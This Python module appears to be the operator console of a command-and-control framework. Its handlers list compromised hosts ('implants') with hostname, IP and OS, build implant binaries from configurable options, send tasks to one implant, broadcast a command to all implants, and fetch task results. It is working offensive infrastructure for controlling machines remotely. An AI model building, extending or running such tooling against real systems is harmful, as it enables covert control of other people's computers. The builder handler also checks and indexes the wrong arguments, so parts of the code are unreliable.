import base64
from dataclasses import dataclass
import json
from typing import Callable, Dict, List, Optional, Union
from tabulate import tabulate
import cli.interact

from comms import (
    get_server_stats,
    get_task_result,
    list_implants,
    get_tasks,
    implant_exists,
    build_implant,
)
from config import OperatorConfig, implant_build_options
from .logging import StyledLogger, get_styled_logger
from .commands import *
from .interact import handle as interact_handle
from opcodes import Opcodes
import structlog

# logger = get_styled_logger()
logger = structlog.get_logger()


def handle(cmd: str, args: List[str], config: OperatorConfig) -> None:
    """
    Handle a command
    """
    if cmd in ["help", "h", "?"]:
        handle_help(args[0] if len(args) > 0 else None)
    elif cmd == "show":
        handle_show(args[0] if len(args) > 0 else None, config)
    elif cmd == "interact":
        handle_interact(args[0] if len(args) > 0 else None, config)
    elif cmd == "result" or cmd == "results":
        handle_result(config, args)
    elif cmd == "exit":
        handle_exit()
    elif cmd == "clear":
        print("\033c")
    elif cmd == "builder":
        handle_builder(args, config)
    elif cmd == "build":
        handle_build(args, config)
    elif cmd == "broadcast":
        handle_broadcast(args, config)
    elif cmd == "":
        return
    else:
        logger.error(f"Command {cmd} not found")


def handle_help(args: Optional[str]) -> None:
    """
    Handle the help command
    """
    if args is None:
        print("Available commands:\n")
        walk_dict(COMMANDS, 0)
        print()
    else:
        if args in COMMANDS:
            print(f"{args}: {COMMANDS[args]}")
        else:
            logger.error(f"Command {args} not found")


def handle_show(args: Optional[str], config: OperatorConfig) -> None:
    """
    Handle the show command
    """
    if args is None:
        print("Available commands:")
        for k, v in COMMANDS["show"].items():
            print(f"{k}: {v}")
    else:
        if args in COMMANDS["show"]:
            if args == "implants":
                show_implants(config)
            elif args == "tasks":
                show_tasks(config)
            elif args == "stats":
                show_stats(config)
        else:
            logger.error(f"Command {args} not found")


def handle_interact(implant_id: Optional[str], config: OperatorConfig) -> None:
    """
    Handle the interact command
    """
    if implant_id is None:
        print("Please specify an implant ID")
    else:
        if implant_exists(config, implant_id):
            print(f"Interacting with implant {implant_id}...")
            cli.interact.interact_prompt(config, implant_id)


def handle_result(config: OperatorConfig, args: List[str]) -> None:
    """
    Handle the result command. Optionally write results to a file
    """
    if len(args) < 1:
        logger.error("Please provide a task ID")
        return
    if len(args) == 2:
        write_task_results_to_file(config, args[0], args[1])
    else:
        print_task_result(config, args[0])


def handle_exit() -> None:
    """
    Handle the exit command
    """
    print("Exiting...")
    exit(0)


def handle_builder(args: List[str], config: OperatorConfig) -> None:
    """
    Handle the build command
    """
    if len(args) < 1:
        logger.error("Please provide an action and a field")
        return

    if args[0] == "set":
        if len(args) < 2:
            logger.error("Please provide a field and a value")
            return
        if args[2] not in implant_build_options:
            logger.error(f"Field {args[2]} not found")
            return

        if len(args) < 3:
            logger.error("Please provide a value")
            return

        implant_build_options[args[1]] = args[2]
        logger.info(f"Set {args[1]} to {args[2]}")
    elif args[0] == "show":
        if args[1] == "all":
            print(
                tabulate(
                    implant_build_options.items(),
                    headers=["Field", "Value"],
                    tablefmt="fancy_grid",
                )
            )
        elif args[1] in implant_build_options:
            print(
                tabulate(
                    [implant_build_options[args[2]]],
                    headers=["Field", "Value"],
                    tablefmt="fancy_grid",
                )
            )
        else:
            logger.error(f"Field {args[2]} not found")


def handle_build(args: List[str], config: OperatorConfig) -> None:
    if len(args) < 1:
        logger.error("Please provide an output file path")
        return

    if len(args) == 1:
        logger.warning("This can take a while to build (~2 min). Please be patient.")
        logger.info("Building implant...")
        implant_b64 = build_implant(config, implant_build_options)
        if implant_b64 == "":
            return
        with open(args[0], "wb") as f:
            f.write(base64.b64decode(implant_b64))
        logger.info(f"Implant written to {args[0]}")


def handle_broadcast(args: List[str], config: OperatorConfig) -> None:
    if len(args) < 1:
        logger.error("Please provide a command to run")
        return
    
    # Get all implant IDs
    implants: List[str] = [i["implant_id"][0:8] for i in list_implants(config)]
    if not implants:
        logger.error("Failed to get implants")
        return

    # Prompt user
    print(f"You are about to send the command '{' '.join(args)}' to {len(implants)} implants.")
    res = input("Are you sure you want to do this? (y/n): ")
    if res not in ['y', 'Y', 'yes']:
        logger.info("Aborting broadcast")
        return

    for i in implants:
        interact_handle(args[0], args[1:], config, i)


############
# Functions to show the implants, operators, tasks, and stats
############


def show_implants(config: OperatorConfig) -> None:
    """
    Show all the implants
    """

    implants = list_implants(config)
    if implants is None:
        logger.error("Failed to get implants")
        return

    minified = []
    for implant in implants:
        minified.append(
            [
                implant["implant_id"][0:8],
                implant["hostname"],
                implant["ip"],
                implant["os"],
                implant["last_seen"],
                implant["created_at"],
            ]
        )

    print(
        tabulate(
            minified,
            headers=["ID", "Hostname", "IP", "OS", "Last Seen", "First Seen"],
            tablefmt="fancy_grid",
        )
    )


def show_stats(config: OperatorConfig) -> None:
    """
    Show the server stats
    """
    stats = get_server_stats(config)
    if stats is None:
        logger.error("Failed to get server stats")
        return

    # Headers are keys, values are in one row
    print(
        tabulate(
            [list(stats.keys()), list(stats.values())],
            headers="firstrow",
            tablefmt="fancy_grid",
        )
    )


def show_tasks(config: OperatorConfig) -> None:
    """
    Show the active tasks that belong to this operator
    """
    tasks = get_tasks(config)

    if tasks is None:
        logger.error("Failed to get tasks")
        return

    if len(tasks) == 0:
        logger.warning("No tasks found")
        return

    minified = []
    for job in tasks:
        if job["status"] != "COMPLETE":
            minified.append(
                [
                    job["task_id"],
                    Opcodes.get_by_value(job["opcode"]),
                    job["status"],
                    job["implant_id"][0:8],
                    job["args"],
                    job["created_at"],
                ]
            )

    print(
        tabulate(
            minified,
            headers=["ID", "Opcode", "Status", "Implant ID", "Args", "Created At"],
            tablefmt="fancy_grid",
            maxcolwidths=[16, 8, 8, 8, 45, 20],
        )
    )


def print_task_result(config: OperatorConfig, task_id: str) -> None:
    """
    Print the result of a task
    """
    taskB64 = get_task_result(config, task_id)
    if taskB64 is None:
        return

    if taskB64 == "":
        logger.info("Task had no output")
        return

    decoded = base64.b64decode(taskB64)
    try:
        task = json.loads(decoded)
    except Exception as e:
        logger.debug("Result is not JSON, printing raw output")
        print(str(decoded, "utf-8"))
        return

    print(tabulate(task.items(), headers=["Key", "Value"], tablefmt="fancy_grid"))


def write_task_results_to_file(config: OperatorConfig, task_id: str, outfile: str):
    """
    Write the result of a task to a file
    """
    taskB64 = get_task_result(config, task_id)
    if taskB64 is None:
        return

    if taskB64 == "":
        logger.info("Task had no output")
        return

    decoded = base64.b64decode(taskB64)
    try:
        task = json.loads(decoded)
    except Exception as e:
        logger.warning("Result is not JSON, writing raw output")
        with open(outfile, "wb") as f:
            f.write(decoded)
        return

    with open(outfile, "w") as f:
        json.dump(task, f, indent=4)
